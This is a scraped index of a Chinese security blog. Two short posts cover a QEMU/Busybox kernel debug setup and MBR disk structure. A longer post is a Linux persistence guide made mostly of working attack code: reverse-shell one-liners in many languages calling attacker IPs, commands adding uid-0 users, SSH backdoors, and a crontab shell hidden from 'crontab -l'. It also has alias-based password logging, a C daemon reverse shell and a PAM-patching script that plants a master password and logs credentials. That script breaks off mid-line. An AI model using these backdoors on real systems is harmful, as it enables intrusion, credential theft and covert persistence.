编译成功后，会生成_install目录，其内容如下： $ ls _install bin linuxrc sbin usr 依次执行如下命令： mkdir initramfs cd initramfs cp ../_install/* -rf ./ mkdir dev proc sys sudo cp -a /dev/{null, console, tty, tty1, tty2, tty3, tty4} dev/ rm linuxrc vim init chmod a+x init 其中init文件的内容如下： #!/bin/busybox sh mount -t proc none /proc mount -t sysfs none /sys exec /sbin/init 在创建的initramfs中包含busybox可执行程序、必须的设备文件、启动脚本init，且init只挂载了虚拟文件系统procfs和sysfs，没有挂载磁盘根文件系统，所有操作都在内存中进行，不会落地。 最后打包initramfs： find . -print0 | cpio --null -ov --format=newc | gzip -9 \u003e ../initramfs.cpio.gz ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"启动内核 qemu-system-i386 -s -kernel /path/to/bzImage -initrd initramfs.cpio.gz -nographic -append \"console=ttyS0\" 参数说明： -s是-gdb tcp::1234缩写，监听1234端口，在GDB中可以通过target remote localhost:1234连接； -kernel指定编译好的调试版内核； -initrd指定制作的initramfs; -nographic取消图形输出窗口； append \"console=ttyS0\"将输出重定向到console，将会显示在标准输出stdio。 启动后的根目录，就是initramfs中包含的内容： 至此，一个简单的内核就算编译完成了，可以挂gdb进行调试了。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:5:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"MBR简介","date":"2020-12-14","objectID":"/2020/12/MBR/","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"MBR简介 ","date":"2020-12-14","objectID":"/2020/12/MBR/:0:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"一、磁盘结构 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"1、磁盘的物理结构 磁盘结构可分为外部结构和内部结构，外部结构主要包括金属固定面板、控制电路板和接口三部分： 其中控制电路板部分包括了主轴调速电路、磁头驱动与伺服定位电路、读写电路、控制与接口电路等，几个主要的芯片：主控芯片、BIOS芯片、缓存芯片、电机驱动芯片；接口部分则一般有几个不同的硬盘接口，主要包括电源插座接口、数据接口和主从跳线接口（设置主、从硬盘，即磁盘驱动器的访问顺序）。 磁盘的内部结构如下： 内部结构则主要有以下几个核心部件： 1. 磁头组件 包括读写磁头、传动手臂、传动轴三部分，最重要的是磁头。传动轴带动传动比，使磁头到达指定位置。磁头是用线圈缠绕在磁芯上制成的，工作原理是利用特殊材料的电阻值会随着磁场变化的原理来读写盘片上的数据。硬盘在工作时，磁头通过感应旋转的盘片上磁场的变化来读取数据；通过改变盘片上的磁场来写入数据。为避免磁头和盘片的磨损，在工作状态时，磁头悬浮在高速转动的盘片上方，间隙只有0.1~0.3um，而不是盘片直接接触，在电源关闭之后，磁头会自动回到在盘片上着陆区，此处盘片并不存储数据，是盘片的起始位置。 2. 磁头驱动组件 磁头的移动是靠磁头驱动组件实现的，硬盘寻道时间的长短与磁头驱动组件关系非常密切。 3. 盘片与主轴组件 盘片是硬盘存储数据的载体，主要是在铝合金或玻璃基底上涂覆很薄的磁性材料、保护材料和润滑材料等多种不同作用的材料层加工而成，其中磁性材料的物理性能和磁层结构直接影响了数据的存储密度和所存储数据的稳定性。玻璃盘片比金属盘片在运行时具有更好的稳定性。 4. 前置控制电路 前置放大电路控制磁头感应的信号、主轴电机调速、磁头驱动和伺服定位等，由于磁头读取的信号微弱，将放大电路密封在腔体内可减少外来信号的干扰，提高操作指令的准确性。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:1","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"2、逻辑结构 磁盘在使用前需要先进行格式化，该过程主要是在逻辑上为每个盘片划分磁道、扇区、柱面等这几个虚拟概念。下图为磁盘的逻辑结构： 磁道 当磁盘旋转时，磁头若保持在一个位置上，则每个磁头都会在磁盘表面划出一个圆形轨迹，该轨迹就称为磁道。磁道是一个个同心圆，通常盘面的一面有成千上万个磁道，磁盘上的信息是沿着轨道进行存放，相邻的磁道间保持一定距离，避免磁化单元相近时会互相影响，也为磁头进行数据读写时降低难度。 扇区 每个盘片的每一面都会划分很多同心圆的磁道，而且还会将每个同心圆进一步分割为多个相等的圆弧，这些圆弧就是扇区（也称扇面）。数据则以扇区为单位进行存储，扇区也是磁盘I/O操作的最小单位（即使只需要某个扇区的几个字节，计算机也必须一次性将整个扇区的全部512字节读入内存，然后再进行数据筛选。）。扇区通常包含标题、数据、ECC(Error Correcting Code)纠错信息，其中标题包含同步和位置信息，ECC功用是对数据段提供错误侦测和纠正。 柱面 硬盘通常由一个或多个盘片构成，而且每个面都被划分为数目相等的磁道，并从外缘开始编号（即最边缘的磁道为0磁道，往里依次累加）。如此磁盘中具有相同编号的磁道会形成一个圆柱，此圆柱称为磁盘的柱面。磁盘的柱面数与一个盘面上的磁道数是相等的。由于每个盘面都有一个磁头，因此，盘面数等于总的磁头数。 对磁盘进行分区的主要目的是为了不同类的目录与文件可以存储进不同的分区，越多分区，也就有更多不同的地方，可以将文件的性质区分得更细，按照更为细分的性质，存储在不同的地方以管理文件。总结下分区的优点： 优化I/O性能 实现磁盘空间配额限制 提高修复速度 隔离系统和程序 安装多个OS 采用不用的文件系统 磁盘结构的3D参数：CHS，C-Cylinder，柱面；H-Head，磁头；S-Sector，扇区。 最后是磁盘的容量 = 柱面数 * 磁头数 * 扇区数 * 512Bytes ，相关的编号方式是：磁道从外到内编号，最外层是0号磁道；扇区的编号为固定标记某块为1号，然后顺时针编号；磁头则是决定读写面号的结构，从0开始顺序编号。 在老式磁盘中，虽然磁道周长不同，但是每个磁道上的扇区数是相同的，越往圆心扇区弧段越短，但其存储密度越高。这种方式显而易见，很浪费空间，所以现代磁盘修改为等密度结构，这也就是说，外围磁道上的扇区数要大于内圈磁道的扇区数，寻址方式上也改为以扇区为单位的线性寻址。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:2","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"二、MBR 磁盘有2种分区方式：MBR和GPT。MBR，全称为Master Boot Record，主引导记录，是指磁盘第1块扇区上的一种数据结构。它在磁盘上的三维地址（柱面，磁头，扇区） = （0，0，1）。这里需要注意，在讨论引导扇区内部结构的时候，有时指的其开头的446字节内容，其后4个16字节的数据是磁盘分区表（DPT），以及2字节的结束标志“55AA”。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"1. MBR结构 MBR记录了磁盘本身的相关信息以及磁盘各个分区的大小及位置信息。MBR内的信息可以通过任何一种基于某种操作系统的分区工具软件写入，和OS没有特定关系，即只要创建了有效的MBR就可以引导某一种OS（因为OS是创建在高级格式化的磁盘分区上的，是和一定的文件系统相关联的）。 一个标准的MBR结构如下： 首先使用dd if=/dev/sda of=mbr.bin bs=1 count=512命令将mbr中的数据导出成mbr.bin后，然后使用hexdump查看bin文件中的数据： 后续将对该文件中的各个部分的数据做详细解读。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:1","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"2. MBR与磁盘分区 MBR的分区方式为4个主分区或3个主分区+1个扩展（N个逻辑分区）。MBR磁盘分区的结构示意图如下： 因为MBR仅仅包含一个64字节大小的DPT，而每个分区需要16字节，所对于采用MBR型分区的磁盘最多只能识别4个主要分区（Primary partition）。如果想获得4个以上的主要分区，就需要使用扩展分区，扩展分区也是主分区的一种，不同点是扩展分区可以在理论上划分成无数个逻辑分区。 扩展分区，它仅仅是一个指向下一个分区的指针，逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的扩展引导记录（EBR），其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。 Windows系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。这里有下面几点需要注意： 在MBR分区表中最多4个主分区或者3个主分区＋1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。 在Linux系统中，磁盘分区命名为sda1－sda4或者hda1－hda4（其中a表示磁盘编号可能是a、b、c等等）。在MBR磁盘中，分区号1－4是主分区（或者扩展分区），逻辑分区号只能从5开始。 在MBR分区表中，一个分区最大的容量为2T，且每个分区的起始柱面必须在这个disk的前2T内。你有一个3T的磁盘，根据要求你至少要把它划分为2个分区，且最后一个分区的起始扇区要位于磁盘的前2T空间内。如果磁盘太大则必须改用GPT。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:2","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"3. MBR组成 1. 启动代码 MBR最开头是第一阶段引导代码，其中的磁盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给磁盘上的引导程序（如grub）。它不依赖任何操作系统，而且启动代码可以改变，从而实现多系统引导。代码区最大长度为446字节。 2. 磁盘分区表 大小为64字节，偏移01be-01fd，对四个分区的信息进行描述，其中每个分区的信息占16个字节。一个详细的磁盘分区结构各字节含义表如下： 例如，某一分区在磁盘分区表的信息如下： 80 01 01 00 0B FE BF FC 3F 00 00 00 7E 86 BB 00 首字节80为分区的激活标志，表示为活动分区，可被系统引导；01 01 00表示分区开始的磁头号为1，扇区好为1，柱面号为0；0b表示分区的系统类型为FAT32，其他比较常用的有04（FAT16）、07（NTFS）；fe bf fc表示分区结束的磁头号为254，分区结束的扇区号为63，分区结束的柱面号为764；3f 00 00 00表示首扇区的相对扇区号为63（小端）；7e 86 bb 00表示总扇区数为12289662（小端）。 （这里需要注意，对于大于8.4G的现代磁盘，CHS的方式已经无法表示，BIOS使用LBA模式，对于超出的部分，CHS值通常设定为0xfeffff，并加以忽略，直接使用偏移0x08-0x0c的4字节相对值，再进行内部转换。） 3. 结束标志字 55 AA，偏移1feh-1ffh，最后2个字节，是检验MBR是否有效的标志。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:3","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"4. 主引导扇区的读取流程 系统开机或者重启。 BIOS上电自检（Power On Self Test – POST）。BIOS执行内存地址为FFFF:0000H处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件（包括内存）进行检查。 读取主引导记录（MBR）。当BIOS检查到硬件正常并与CMOS中的设置相符后，按照CMOS中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区（也就是MBR扇区）读入内存地址为0000:7C00H处。 检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示\"NO ROM BASIC\"然后死机。 当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到0000:0600H处，然后继续执行。 根据MBR中的引导代码启动引导程序。 事实上，BIOS不仅检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，往往还对磁盘是否有写保护、主引导扇区中是否存在活动分区等进行检查。如果发现磁盘有写保护，则显示磁盘写保护出错信息；如果发现磁盘中不存在活动分区，则显示类似如下的信息“Remove disk or other media Press any key to restart”。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:4","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"简单总结下Linux平台下的反弹shell方法和权限维持方法","date":"2020-12-13","objectID":"/2020/12/Backdoor/","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"权限维持 – Linux ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:0:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"一、Basic Knowledge ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. 概念 可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:1","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"2. 前置条件 – 获取初始权限 获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法： 1. Bash反弹 攻击机监听： nc -lvvp port 目标执行： bash -i \u003e\u0026 /dev/tcp/x.x.x.x/port 0\u003e\u00261 或者 bash -i 5\u003c\u003e/dev/tcp/host/port 0\u003e\u00265 1\u003e\u00265 bash -i：打开一个交互的bash \u003e\u0026 /dev/tcp/x.x.x.x/port：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。 0\u003e\u00261：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。 第二种则是将标准输入、输出和错误均重定向到socket连接文件。 备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。 2. telnet反弹 第一种： 攻击机开2个终端，分别执行监听： nc -lv port1 和 nv -lv port2 目标主机执行： telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。 第二种： 攻击机监听： nc -lv port 目标主机执行： rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0\u003c/tmp/a | /bin/bash 1\u003etmp/a 其中x.x.x.x为攻击机ip。 3. nc(netcat)反弹 攻击机监听： nc -lv port 目标执行： nc -e /bin/bash x.x.x.x port 如果目标上没有-e参数可以使用以下命令： rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2\u003e$1 | nc x.x.x.x port \u003e/tmp/f mkfifo的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。 此外，也可以使用telnet的监听2个端口的方式： nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2 4. 常见脚本反弹 下述脚本均需要现在攻击机上开启监听：nc -lv port，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。 1. Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 2. Perl 第一种： perl -e 'use Socket;$i=\"x.x.x.x\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' 第二种： perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:port\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' 3. Ruby 第一种： ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 第二种： ruby -rsocket -e'f=TCPSocket.open(\"x.x.x.x\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' 4. PHP php -r '$sock=fsockopen(\"x.x.x.x\",port);exec(\"/bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5\u003c\u003e/dev/tcp/x.x.x.x/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\" 3. 其他方法 1. socat 攻击机监听： socat file:`tty`,raw,echo=0 tcp-listen:port 上传socat到目标主机，然后执行： socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port 2. 只有80和443端口且反弹shell流量被拦截 方法论：加密流程，绕过拦截 Step 1：VPS上生成SSL证书的公钥/私钥对 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes Step 2：VPN监听反弹shell openssl s_server -quiet -key key.pem -cert cert.pem -port 443 Step 3：连接 mkfifo /tmp/v4ler1an;/bin/bash -i \u003c /tmp/v4ler1an 2\u003e\u00261 |openssl s_client -quiet -connect x.x.x.x:443 \u003e /tmp/v4ler1an 此时的shell存在缺陷（无法命令补全等），通过以下方法修复： python -c 'import pty; pty.spawn(\"/bin/bash\")' pty是一个伪终端模块。pty.spawn(argv[, master_read[, stdin_read]])产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。 在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:2","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"二、权限维持方法 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. 一句话添加用户和密码 添加普通用户： # 创建一个用户名guest，密码为123456的普通用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd方法 useradd guest;echo 'guest:123456'|chpasswd # echo -e方法 useradd guest;echo -e \"123456\\n123456\\n\" |passwd guest 添加root用户： # 创建一个用户名为guest，密码为123456的root用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest 排查方法： # 查询特权用户（uid = 0） awk -F: '$3==0{print $1}' /etec/passwd # 查询可以远程登录的帐号信息 awk '/\\$1|\\$6/{print $1}' /etc/shadow # 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:1","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"2. 增加超级用户 在完成用户添加后，可以对添加的用户赋予超级用户权限。 目标主机执行： echo \"v4ler1an❌0:0::/:/bin/sh\" \u003e\u003e /etc/passwd 如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号： echo \"v4ler1an:👎-1👎-1👎-1:500\" \u003e\u003e /etc/shadow 有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:2","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. SSH后门 1. sshd 软连接 目标主机建立软连接： ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 攻击机直接ssh登录 ssh root@x.x.x.x -p 5555 这里端口可以任意，但是/tmp/su部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见Linux的一个后门引发对PAM的探究。 缺点：易被排查，通过进程、端口可以轻松看到异常，使用kill -s 9 PID即可清除后门。 2. ssh免密后门(文件落地) 在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为~/.ssh/authorized_keys，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。 生成公钥和私钥： ssh-keygen -t rsa 进入/root/.ssh，将公钥id_rsa.pub的内容复制到目标主机（是否上传替换文件取决于具体情况），在/root/.ssh/authorized_keys中追加id_rsa.pub中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。) 缺点：易被排查，检查/root/.ssh/authorized_keys是否被修改，清理不受信的公钥即可清除后门。 3. ssh wrapper（文件落地） 目标主机上执行： cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' \u003esshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' \u003e\u003esshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' \u003e\u003esshd chmod u+x sshd /etc/init.d/sshd restart 完成后执行cat sshd进行验证，输出如下则说明配置成功： #!/usr/bin/perl exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/); exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV, 攻击机上执行： socat STDIO TCP4:x.x.x.x:22,sourceport=13377 这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。 python \u003e\u003e\u003e import struct \u003e\u003e\u003e buffer = struct.pack('\u003eI6',19256) \u003e\u003e\u003e print repr(buffer) '\\x00\\x00LF' \u003e\u003e\u003e buffer = struct.pack('\u003eI6',13377) \u003e\u003e\u003e print buffer 4A 原理简单说明：init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell 简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。 排查方法： ls -al /usr/sbin/sshd cat /usr/sbin/sshd 如果想彻底恢复的话，需要进行ssh服务的重装。 4. ssh的隐身登录 在进行ssh登录时可以使用以下命令实现隐身登录，避免被last\\who\\w等指令检测到。 # 不被last\\who\\w等指令检测 ssh -T username@x.x.x.x /bin/bash -i # 不记录ssh公钥在本地.ssh目录中 ssh -o UserKnownHostFile=/dev/null -T user@x.x.x.x /bin/bash -if ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:3","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"3. SUID Shell 需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限： cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:4","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"4. crontab后门（文件落地） crontab命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。 Step 1 ：创建shell脚本，例如在/etc/evil.sh #!/bin/bash bash -i \u003e\u0026 /dev/tcp/192.168.160.154/12345 0\u003e\u00261 并给脚本赋予相应权限： chmod +sx /etc/evil.sh Step 2：设置定时服务 crontab -e 输入以下内容： # exec per min */1 * * * * root /etc/evil.sh 重启crond服务，service crond restart，然后使用nc接收shell。 上述方法在实际测试中成功了率较低，建议使用一句话后门： (crontab -l;printf \"*/1 * * * * /tmp/crontab_backdoor.sh;\\rno crontab for `whoami`%100c\\n\")|crontab - 这种方式成功率更高，而且不易被crontab -l发现。 其中关于crondtab的详细原理可以参考：https://cloud.tencent.com/developer/article/1683265 排查手段： # 查看可以的定时任务列表 crontab -e ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:5","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"5. alias欺骗（文件落地） 可以通过alias命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例： 修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能： alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' 利用守护进程回弹shell alias cat='cat\u0026\u0026/root/.shell' 回弹shell的c语言版脚本： // shell.c #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003ctime.h\u003e#include \u003cfcntl.h\u003e#include \u003cstring.h\u003e#include \u003csys/stat.h\u003e#include \u003csignal.h\u003e #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); // 将ip和端口进行替换 system(\"bash -i \u003e\u0026 /dev/tcp/192.168.80.147/12345 0\u003e\u00261\"); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(\"fork error\"); if(pid \u003e 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(\"SETSID ERROR\"); chdir(\"/\"); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd \u003c fdtablesize; fd++) close(fd); devnullfd = open(\"/dev/null\", 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(\"can't open /dev/null\"); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDIN_FILENO\"); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } signal(SIGCHLD,SIG_IGN); return; } 使用nc监听回弹的shell。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:6","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"6. Linux PAM密码记录后门（文件落地） PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下： 获取目标系统所使用的PAM版本，下载对应版本的pam版本 解压缩，修改pam_unix_auth.c文件，添加万能密码 编译安装PAM 编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 一个自动化脚本如下： #!/bin/bash ## ##查看版本: ##redhat yum list pam ##debian\u0026Ubuntu dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 ## PASS='test123' ##...... LOG='\\/bin\\/.sshlog' ##...... echo \" .___ ___. ___ ___ _______ ____ ____ | \\/ | / _ \\ / _ \\ | \\ \\ \\ / / | \\ / | | | | | | | | | | .--. | \\ \\/ / | |\\/| | | | | | | | | | | | | | \\_ _/ | | | | | |_| | | |_| | | '--' | | | |__| |__| \\___/ \\___/ |_______/ |__| \" echo -e \"\\nPam-Backdoor\\n{code this shit while learning pam}\\n\\n\" oldtime=`stat -c '%z' /lib/security/pam_ftp.so` echo 'Pam backdoor starting!' mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz' #mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'，修改为对应的pam版本 echo 'Fetching from '$mirror_url wget $mirror_url #fetch the roll tar zxf Linux-PAM-1.1.1.tar.gz #untar,修改为对应的pam版本 cd Linux-PAM-1.1.1 #find and replace sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\\n\\tif (strcmp(p,\"'$PASS'\")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\\n\\tFILE * fp;\\n\\tfp = fopen(\"'$LOG'\", \"a\");\\n\\tfprintf(fp, \"%s : %s\\\\n\", name, p);\\n\\tfclose(fp);\\n\\t}/g' modules/pam_unix/pam_unix_auth.c DIS=`head /etc/issue -n 1|awk '{print $1}'` #get the version if [ $DIS = \"CentOS\" ];then ./configure --disable-selinux \u0026\u0026 make else ./configure \u0026\u0026 make fi #copy modified pam_unix.so if [ 